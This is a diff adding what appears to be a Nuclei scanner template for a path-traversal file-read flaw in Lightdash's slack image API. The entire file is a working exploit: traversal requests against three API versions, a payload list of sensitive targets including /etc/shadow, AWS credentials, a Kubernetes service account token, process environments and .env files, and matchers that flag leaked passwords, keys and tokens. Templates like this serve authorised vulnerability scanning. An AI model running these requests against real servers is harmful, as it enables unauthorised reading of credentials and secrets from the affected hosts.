@@ -1,0 +1,58 @@
+id: lightdash-lfi
+
+info:
+  name: lightdash api file read
+  severity: high
+  description: |
+    lightdash has an api endpoint to read slack image but it can abused to read arbitray file
+  author: reewarius
+  tags: lfi,lfr,generic
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/slack/image/slack-image{{ url_encode(concat('/../../../../..', file)) }}"
+      - "{{BaseURL}}/api/v2/slack/image/slack-image{{ url_encode(concat('/../../../../..', file)) }}"
+      - "{{BaseURL}}/api/v3/slack/image/slack-image{{ url_encode(concat('/../../../../..', file)) }}"
+      
+    payloads:
+      file:
+        - "/etc/passwd"
+        - "/etc/shadow"
+        - "%2Fetc%2Fpasswd"
+        - "/root/.aws/credentials"
+        - "/etc/environment"
+        - "/var/run/secrets/kubernetes.io/serviceaccount/token"
+        - "/proc/1/environ"
+        - "/proc/80/environ"
+        - "/proc/81/environ"
+        - "/proc/82/environ"
+        - "/proc/83/environ"
+        - "/proc/self/environ"
+        - "/usr/app/.devcontainer/devcontainer.json"
+        - "/usr/app/.env"
+        - "/usr/app/.env.local"
+        - "/usr/app/.env.prodction"
+        - "/usr/app/.env.prodction.local"
+        - "/usr/app/.env.test.local"
+        - "/usr/app/credentials.json"
+        - "/usr/app/lightdash.yml"
+        - "/usr/app/lightdash_dev.yml"
+        - "/usr/app/docker-compose.yml"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+          
+      - type: word
+        words:
+          - "PATH="
+          - "LIGHTDASH"
+          - "PASS"
+          - "AWS"
+          - "eyJhb"
+        condition: or
